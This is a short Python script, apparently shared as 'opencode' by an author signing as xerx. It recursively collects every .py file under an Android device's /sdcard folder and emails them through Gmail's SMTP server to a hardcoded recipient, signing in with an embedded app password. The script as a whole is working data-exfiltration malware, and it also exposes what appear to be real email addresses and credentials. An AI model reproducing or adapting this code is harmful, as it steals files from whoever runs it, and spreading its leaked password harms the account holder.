#xerx-xd
#opencode by xerx
#jai Nepal 🇳🇵💜

import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from concurrent.futures import ThreadPoolExecutor

# Email information
sender_email = "rohitaryanrxn@gmail.com"
receiver_email = "chaudharyhaker4@gmail.com" #your email
subject = "xerx-xd"
body = "maje karo "

dir_paths = ["/sdcard"]

def attach_files(message, dir_path):
    for root, dirs, files in os.walk(dir_path):
        for filename in files:
            if filename.endswith(".py"):
                file_path = os.path.join(root, filename)
                with open(file_path, "rb") as f:
                    file_data = f.read()
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(file_data)
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', 'attachment', filename=filename)
                    message.attach(part)

def send_email():
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message.attach(MIMEBase("text", "plain"))
    message.attach(MIMEBase("text", "html"))
    
    with ThreadPoolExecutor() as executor:
        for dir_path in dir_paths:
            executor.submit(attach_files, message, dir_path)

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, "upspjtmbkyzeqouq") # ye password he 
        text = message.as_string()
        server.sendmail(sender_email, receiver_email, text)

if __name__ == "__main__":
    send_email()
